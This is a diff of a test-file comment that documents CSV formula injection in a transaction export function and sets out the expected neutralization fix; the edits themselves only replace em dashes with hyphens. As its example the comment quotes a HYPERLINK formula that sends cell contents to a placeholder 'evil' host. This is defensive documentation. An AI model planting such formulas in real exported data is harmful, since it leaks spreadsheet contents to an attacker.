@@ -11,7 +11,7 @@ import { escapeCsvValue, buildCsvString } from "@modules/transactions/transactio
  * correctly (`"`, `,`, `\n`) but does nothing about formula injection: a transaction titled
  * `=HYPERLINK("http://evil/"&A1,"Click")` is written to the CSV verbatim, and Excel/LibreOffice/
  * Sheets execute it on open. It also misses a lone `\r` in its quoting character class
- * (`BUG-11`) — `/[",\n]/` does not match `"a\rb"`.
+ * (`BUG-11`) - `/[",\n]/` does not match `"a\rb"`.
  *
  * `buildCsvString` (:404-406) is the single choke point both CSV export paths share:
  * `utils/exportUtils.ts`'s `transactionsToCsv` (transaction download) and
@@ -19,7 +19,7 @@ import { escapeCsvValue, buildCsvString } from "@modules/transactions/transactio
  * inside `escapeCsvValue` itself covers both without touching either caller.
  *
  * Contract assumed for the fix: any value beginning with `=`, `+`, `-`, `@`, a tab, or a CR is
- * neutralized (prefixed so spreadsheet software no longer treats it as a formula — e.g. a
+ * neutralized (prefixed so spreadsheet software no longer treats it as a formula - e.g. a
  * leading single quote, or wrapping in quotes with a neutralizing prefix inside), and `\r` joins
  * `"`/`,`/`\n` in the existing quoting character class. The exact neutralization character is
  * left unpinned here (asserted only as "no longer starts with the raw dangerous prefix") so the
